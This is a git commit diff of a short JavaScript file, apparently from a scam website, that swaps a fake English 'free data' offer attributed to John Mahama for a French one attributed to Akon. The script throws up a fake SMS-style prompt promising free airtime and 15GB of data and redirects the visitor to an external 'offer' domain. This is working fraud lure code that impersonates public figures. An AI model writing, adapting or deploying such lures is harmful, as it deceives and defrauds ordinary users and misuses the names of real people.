069cf00b8e9e580bc0aa29f928d5c3a8333b1a64
essac5 <154714847+essac5@users.noreply.github.com>
2024-09-26 04:23:06 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '15Go Internet gratuit'
+password=prompt('SMS: Félicitations, vous faites partie des 10,000 fans qui recevront 2 000 F de temps dantenne et 15Go de données gratuites de loffre d anniversaire d AKON. Veuillez appuyer sur OK pour ACTIVER ','15Go Internet gratuit');
+if (password != '15Go Internet gratuit') {
+location.href='https://akon.4g-data.info/15GB';
 }
